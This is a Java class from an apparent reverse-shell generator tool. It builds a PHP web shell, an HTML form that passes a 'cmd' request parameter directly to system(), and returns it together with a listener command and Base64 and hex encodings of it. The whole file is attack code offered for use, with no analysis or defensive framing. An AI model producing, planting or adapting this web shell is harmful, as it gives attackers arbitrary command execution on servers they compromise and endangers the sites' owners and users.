package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Php_cmd extends Reverse {

    protected String shellFormat = "";

    public Php_cmd(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("<html>\\n" + //
                "<body>\\n" + //
                "<form method=\\\"GET\\\" name=\\\"<?php echo basename($_SERVER[\\'PHP_SELF\\']); ?>\\\">\\n" + //
                "<input type=\\\"TEXT\\\" name=\\\"cmd\\\" id=\\\"cmd\\\" size=\\\"80\\\">\\n" + //
                "<input type=\\\"SUBMIT\\\" value=\\\"Execute\\\">\\n" + //
                "<\\/form>\\n" + //
                "<pre>\\n" + //
                "<?php\\n" + //
                "    if(isset($_GET[\\'cmd\\']))\\n" + //
                "    {\\n" + //
                "        system($_GET[\\'cmd\\']);\\n" + //
                "    }\\n" + //
                "?>\\n" + //
                "<\\/pre>\\n" + //
                "<\\/body>\\n" + //
                "<script>document.getElementById(\\\"cmd\\\").focus();<\\/script>\\n" + //
                "<\\/html>");
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
    
} 